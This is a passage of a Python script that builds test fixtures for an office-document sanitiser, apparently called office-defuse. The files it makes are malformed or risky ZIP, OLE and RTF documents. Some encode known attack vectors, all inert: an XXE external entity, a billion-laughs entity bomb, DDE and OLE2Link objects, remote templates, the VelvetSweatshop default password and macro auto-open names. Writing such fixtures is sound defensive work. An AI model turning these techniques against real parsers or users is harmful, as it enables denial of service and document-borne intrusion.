    ('odf-script-url-link.odp', lambda: case_odf_events('presentation', '<office:presentation><draw:page draw:name="p1"><draw:frame svg:width="2cm" svg:height="1cm"><draw:text-box><text:p><text:a xlink:href="javascript:void(0)">x</text:a></text:p></draw:text-box></draw:frame></draw:page></office:presentation>')),
    # Refused on purpose: the container, the XML or the format is one office-defuse does not read.
    ('truncated.docx', lambda: broken_docx()[:300]),
    ('comment-past-end.zip', lambda: assemble(docx_entries(), eocd={'comment_length': 200})),
    ('directory-outside-file.docx', lambda: assemble(docx_entries(), cd_offset_delta=100000)),
    ('two-archives.docx', case_two_archives),
    ('utf8-flag-mismatch.xlsx', lambda: assemble([dict(e, lfh={'flags': 0x0800}) if e['name'] == '_rels/.rels' else e for e in entries_of(xlsx())])),
    ('descriptor-flag-no-descriptor.odt', lambda: assemble([dict(e, flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}) if e['name'] == 'content.xml' else e for e in entries_of(odf())])),
    ('local-name-differs.docx', lambda: broken_docx(lfh={'name': b'word/aaaaaaaaaaaa.xml'})),
    ('duplicate-name-case.xlsx', lambda: assemble(entries_of(xlsx()) + [entry('xl/worksheets/Sheet1.xml', b'<x/>')])),
    ('encrypted-entries.zip', case_encrypted_entries),
    ('unicode-path-field.docx', lambda: assemble(docx_entries(cd_extra=struct.pack('<HHBI', 0x7075, 5 + 13, 1, zlib.crc32(b'word/document.xml') & 0xffffffff) + b'word/othe.xml'))),
    ('backslash-names.xlsx', lambda: assemble([dict(e, name=e['name'].replace('xl/', 'xl\\', 1)) if e['name'].startswith('xl/') and e['name'] != 'xl/workbook.xml' else e for e in entries_of(xlsx())])),
    ('dot-slash-name.docx', lambda: assemble([dict(e, name='./' + e['name']) if e['name'] == 'word/document.xml' else e for e in docx_entries()])),
    ('leading-slash-name.odt', lambda: assemble([dict(e, name='/' + e['name']) if e['name'] == 'content.xml' else e for e in entries_of(odf())])),
    ('end-record-in-comment.docx', case_end_in_comment),
    ('one-byte-local-extra.docx', lambda: broken_docx(lfh_extra=b'\x0a')),
    ('wrong-crc.docx', lambda: broken_docx(lfh={'crc': 0x0badc0de}, cd={'crc': 0x0badc0de})),
    ('zip64-end-disagrees.docx', case_zip64_end_disagrees),
    # Document types: information without an internal subset, removable with one, and limits on its entities.
    ('manifest-doctype.odt', case_ooo2_text),
    ('math-object-doctype.odt', lambda: zip_bytes(odf(body='<office:text><text:p><draw:frame><draw:object xlink:href="./Object 1"/></draw:frame></text:p></office:text>',
                                                      files=[('Object 1/content.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE math:math PUBLIC "-//OpenOffice.org//DTD Modified W3C MathML 1.01//EN" "math.dtd"><math:math xmlns:math="http://www.w3.org/1998/Math/MathML"><math:mi>A</math:mi></math:math>')]))),
    ('external-entity-in-text.docx', lambda: zip_bytes([(n, d.replace(b'?>\n', b'?>\n<!DOCTYPE w:document [<!ENTITY marker SYSTEM "https://example.invalid/marker.xml">]>', 1) if n == 'word/document.xml' else d)
                                                        for n, d in docx('<w:p>%s</w:p>' % run('&marker;'))])),
    ('billion-laughs.xlsx', lambda: zip_bytes(xlsx(parts=[('xl/sharedStrings.xml', XML_DECL + ('%s<sst xmlns="%s" count="1" uniqueCount="1"><si><t>&lol9;</t></si></sst>' % (billion_laughs('sst'), S)).encode())],
                                                   overrides=[('xl/sharedStrings.xml', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml')], workbook_rels=[rel('rId2', RT + 'sharedStrings', 'sharedStrings.xml')]))),
    ('manifest-prefix-from-dtd.odb', lambda: case_sun_xml('application/vnd.sun.xml.base', '', 'urn:oasis:names:tc:opendocument:xmlns:office:1.0')),
    ('sun-xml-calc.ods', lambda: case_sun_xml('application/vnd.sun.xml.calc', ' xmlns:manifest="http://openoffice.org/2001/manifest"', 'http://openoffice.org/2000/office')),
    ('undeclared-prefix.odt', lambda: zip_bytes([(n, d.replace(b' ' + NS_ODF.split(' ')[0].encode(), b'') if n == 'content.xml' else d) for n, d in odf()])),
    ('unclosed-root.odt', lambda: zip_bytes([(n, d.replace(b'</office:document-content>', b'') if n == 'content.xml' else d) for n, d in odf()])),
    ('mismatched-end-tag.docx', lambda: case_doc_with('word/document.xml', word_document('<w:p><w:r><w:t>x</w:r></w:t></w:p>'))),
    ('duplicate-attribute.docx', lambda: case_doc_with('word/document.xml', word_document('<w:p><w:pPr><w:jc w:val="left" w:val="right"/></w:pPr></w:p>'))),
    # PowerPoint writes an add-in's presentation part empty, since an add-in has no slides. A presentation needs its own.
    ('empty-main-part.ppam', lambda: zip_bytes(opc('ppam', 'ppt/presentation.xml', b'', part_rels={'ppt/presentation.xml': [rel('rId1', MSR + 'vbaProject', 'vbaProject.bin')]}, **vba('ppam', 'ppt')))),
    ('empty-main-part.pptx', lambda: zip_bytes([(n, b'' if n == 'ppt/presentation.xml' else d) for n, d in pptx()])),
    ('ascii-declaration.xlsx', lambda: case_ascii_declaration('plain text')),
    ('ascii-declaration-utf8.xlsx', lambda: case_ascii_declaration('caf\u00e9')),
    ('text-outside-root.xlsx', lambda: zip_bytes([(n, d + b'garbage' if n == '_rels/.rels' else d) for n, d in xlsx()])),
    ('vml-nul-character.xlsx', case_vml_nul),
    ('deep-nesting.docx', case_deep_nesting),
    ('encrypted-package.odt', lambda: zip_bytes(odf(manifest_extra='<manifest:file-entry manifest:full-path="secret.xml" manifest:media-type="text/xml"><manifest:encryption-data manifest:checksum-type="SHA1/1K" manifest:checksum="AAAA"/></manifest:file-entry>'))),
    ('xps-document.xps', lambda: zip_bytes([('[Content_Types].xml', types([('FixedDocumentSequence.fdseq', 'application/vnd.ms-package.xps-fixeddocumentsequence+xml')])),
                                            ('_rels/.rels', rels(rel('rId1', 'http://schemas.microsoft.com/xps/2005/06/fixedrepresentation', 'FixedDocumentSequence.fdseq'))),
                                            ('FixedDocumentSequence.fdseq', b'<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06"/>')])),
    ('metadata-only.zip', lambda: zip_bytes([('[Content_Types].xml', types([('docProps/core.xml', 'application/vnd.openxmlformats-package.core-properties+xml')])),
                                             ('_rels/.rels', rels(rel('rId1', 'http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties', 'docProps/core.xml'))),
                                             ('docProps/core.xml', b'<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>')])),
    ('theme-package.docx', lambda: zip_bytes([(n, d.replace(MAIN['docx'].encode(), b'application/vnd.openxmlformats-officedocument.themeManager+xml') if n == '[Content_Types].xml' else d) for n, d in docx('<w:p/>')])),
    ('plain-archive.zip', lambda: zip_bytes([('a.txt', b'a'), ('b.txt', b'b')])),
    ('empty-archive.xlsx', lambda: assemble([])),
    ('odf-inside-folder.odt', lambda: zip_bytes([('package/' + n, d) for n, d in odf()])),
    ('mimetype-not-media-type.odt', lambda: zip_bytes([(n, b'\x89PNG\r\n\x1a\n' if n == 'mimetype' else d) for n, d in odf()])),
    # Compound files and RTF, which 0.1.0 refused as not a ZIP archive.
    ('ole-vba-macros.doc', lambda: word_doc('Inert text.\r', extra=[Storage('Macros', VBA_PROJECT)])),
    ('ole-embedded-package.doc', case_embedded_package),
    ('ole-stale-directory-sector.doc', case_stale_sector),
    ('ole-chain-past-size.xls', case_chain_past_size),
    ('ole-mini-fat-count-only.xls', lambda: cfb([Stream('Workbook', workbook([('Sheet1', 0, 0x10)]).ljust(4096, b'\0'))], mutate=lambda m: set_header(m, minifat_count=1))),
    ('ole-unused-entry-in-tree.doc', lambda: word_doc('Inert text.\r', mutate=lambda m: set_entry(m, '1Table', type=0))),
    ('ole-excel-dde-link.xls', lambda: xls([('Sheet1', 0, 0x10)], globals_extra=supbook(0, 'inert-app\x03inert topic') + extern_name('A1', 0x7FE2) + extern_name('StdDocumentName', 0x7FEA))),
    ('ole-excel-encoded-paths.xls', lambda: xls([('Sheet1', 0, 0x10)], globals_extra=supbook(1, '\x01\x01@inert.example.invalid\x03share\x03a.xls') + supbook(1, '\x01\x05\x1chttps://example.invalid/books\x03b.xls') + supbook(1, '\x01\x02dir\x03c.xls'))),
    ('ole-xlm-velvetsweatshop.xls', lambda: cfb([Stream('Workbook', biff_encrypt(workbook([('Sheet1', 0, 0x10), ('Macro1', 1, 0x40)], globals_extra=lbl('', builtin=1)), 'VelvetSweatshop'))])),
    ('ole-word6-wordbasic.dot', lambda: word6_doc('Inert text.\r', macros=64, dot=True)),
    ('ole-compressed-equation.ppt', lambda: ppt(objects=[(3, ex_ole_stg(cfb(ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), root_clsid=EQUATION_CLSID), True))],
                                               document=prec(0x0409, prec(0x0FCC, prec(0x0FC3, struct.pack('<IIIIII', 1, 0, 1, 0, 3, 0)), container=True), container=True))),
    ('ole-message-attachments.msg', lambda: msg([attachment(0, 1, 'inert.txt', 'text/plain', data=b'inert marker'), attachment(1, 2, 'shared.txt', path='\\\\inert.example.invalid\\share\\shared.txt')])),
    ('ole-publisher95.pub', lambda: cfb([Stream('Contents', bytes(64)), Storage('Objects', [])], root_clsid='00021201-0000-0000-00C0-000000000046')),
    ('ole-other-word-identifier.doc', lambda: cfb([Stream('WordDocument', struct.pack('<H', 0xA699) + bytes(2046))])),
    ('ole-powerpoint4.ppt', lambda: cfb([Stream('PP40', bytes(256)), Stream('\x05SummaryInformation', bytes(48))])),
    ('ole-bare-equation-object.bin', lambda: cfb(ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), root_clsid=EQUATION_CLSID)),
    ('ole-velvetsweatshop-package.xlsx', lambda: encrypted_package(zip_package('xlsx'), 'VelvetSweatshop', spin=1000)),
    ('ole-encrypted-package-stub.docx', lambda: encrypted_package(zip_package('docx'), 'VelvetSweatshop', kind='standard', stub=True)),
    ('ole-password-package.docx', lambda: encrypted_package(zip_package('docx'), 'inert-password', spin=1000)),
    ('rtf-ole2link-decoys.rtf', case_ole2link_decoys),
    ('rtf-equation-starred-groups.rtf', case_starred_groups),
    ('rtf-ole2link-cut-storage.rtf', lambda: rtf(rtf_object(ole1('OLE2Link', cfb([Stream('\x01Ole', ole_stream(url_moniker(INERT_URL)))])[:1600]), 'OLE2Link', '\\objautlink\\objupdate'))),
    ('rtf-text-past-document.rtf', lambda: b'{\\rtf1\\ansi Inert text.\\par}}\r\nInert text past the document group.\\par}'),
    ('rtf-activex-control.rtf', lambda: rtf('{\\object\\objocx{\\*\\objclass Inert.Control.1}{\\*\\objdata ' + hexify(ole1('Inert.Control.1', b'inert marker')) + '}}')),
    ('rtf-remote-template.rtf', lambda: rtf('{\\*\\template https://example.invalid/inert.dotm}')),
    ('xlm-auto-open-name.xlsm', case_auto_open_name),
]


def cases():
    """Writes test/fixtures/cases. Needs nothing but Python. manifest.json, which describes each file, is kept."""
    folder = os.path.join(OUT, 'cases')
    os.makedirs(folder, exist_ok=True)
    for name in os.listdir(folder):
        if name != 'manifest.json':
            os.remove(os.path.join(folder, name))
    for name, build in CASES:
        with open(os.path.join(folder, name), 'wb') as f:
            f.write(build())

def png_pixel():
    """A PNG of one gray pixel, a whole picture file of its own."""
    def chunk(kind, data):
        return struct.pack('>I', len(data)) + kind + data + struct.pack('>I', zlib.crc32(kind + data) & 0xffffffff)
    ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 0, 0, 0, 0)
    return b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', ihdr) + chunk(b'IDAT', zlib.compress(b'\x00\x80')) + chunk(b'IEND', b'')


# The start of a JPEG file and an inert marker, which is all a reader of the first bytes looks at.
JPEG = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00inert marker\xff\xd9'


def media():
    """media/: packages and RTF files holding pictures and other whole files, which go to the file plugins, beside
    binary parts of the formats themselves, which do not."""
    folder = os.path.join(OUT, 'media')
    shutil.rmtree(folder, ignore_errors=True)
    os.makedirs(folder)
    png = png_pixel()
    a = 'http://schemas.openxmlformats.org/drawingml/2006/main'
    pic = 'http://schemas.openxmlformats.org/drawingml/2006/picture'
    blip = ('<w:r><w:drawing><a:graphic xmlns:a="%s"><a:graphicData uri="%s"><pic:pic xmlns:pic="%s"><pic:blipFill>'
            '<a:blip r:embed="rIdPng"/></pic:blipFill></pic:pic></a:graphicData></a:graphic></w:drawing></w:r>') % (a, pic, pic)
    vml = '<w:r><w:pict><v:shape><v:imagedata r:id="rIdJpeg"/></v:shape></w:pict></w:r>'
    write_zip(os.path.join(folder, 'pictures.docx'), docx(
        '<w:p>%s%s</w:p>' % (blip, vml),
        parts=[('word/media/image1.png', png), ('word/media/image2.jpeg', JPEG), ('docProps/thumbnail.jpeg', JPEG),
               ('word/printerSettings/printerSettings1.bin', b'inert printer settings'), ('word/fonts/font1.odttf', b'inert obfuscated font')],
        defaults=[('png', 'image/png'), ('jpeg', 'image/jpeg'), ('bin', 'application/vnd.openxmlformats-officedocument.wordprocessingml.printerSettings'),
                  ('odttf', 'application/vnd.openxmlformats-officedocument.obfuscatedFont')],
        package_rels=[rel('rIdThumb', 'http://schemas.openxmlformats.org/package/2006/relationships/metadata/thumbnail', 'docProps/thumbnail.jpeg')],
        part_rels={'word/document.xml': [rel('rIdPng', RT + 'image', 'media/image1.png'), rel('rIdJpeg', RT + 'image', 'media/image2.jpeg'),
                                         rel('rIdPrint', RT + 'printerSettings', 'printerSettings/printerSettings1.bin'),
                                         rel('rIdFont', RT + 'font', 'fonts/font1.odttf')]}))
    body = ('<office:text><text:p><draw:frame><draw:image xlink:href="Pictures/1.png"/></draw:frame></text:p>'
            '<text:p><draw:frame><draw:image xlink:href="./Pictures/2.jpeg"/></draw:frame></text:p></office:text>')
    write_zip(os.path.join(folder, 'pictures.odt'), odf(body, files=[('Pictures/1.png', png), ('Pictures/2.jpeg', JPEG), ('Thumbnails/thumbnail.png', png)]))
    rtf = (b'{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Times New Roman;}}Pictures.\\par\n'
           b'{\\pict\\pngblip\\picw1\\pich1 ' + png.hex().encode() + b'}\\par\n'
           b'{\\*\\shppict{\\pict\\jpegblip\\picw1\\pich1\r\n' + JPEG.hex().encode() + b'}}{\\nonshppict{\\pict\\wmetafile8\\picw1\\pich1 0100}}\\par\n'
           b'{\\pict\\pngblip\\bin' + str(len(png)).encode() + b' ' + png + b'}\\par}')
    with open(os.path.join(folder, 'pictures.rtf'), 'wb') as f:
        f.write(rtf)


def main():
    try:
        if sys.argv[1:] == ['media']:
            media()
            return
        if sys.argv[1:] != ['cases']:
            for sub in ('lo', 'docs', 'zip', 'ole', 'rtf', 'cfb'):
                shutil.rmtree(os.path.join(OUT, sub), ignore_errors=True)
            soffice_exports()
            docs()
            zips()
            binary()
            media()
            for sub in ('docs', 'zip'):
                for name in sorted(os.listdir(os.path.join(OUT, sub))):
                    fixed_times(os.path.join(OUT, sub, name))
        cases()
        vba_fixtures()
    finally:
        shutil.rmtree(TMP, ignore_errors=True)
    count = sum(len(files) for _, _, files in os.walk(OUT))
    print('wrote %d fixtures under %s' % (count, OUT))


if __name__ == '__main__':
    main()
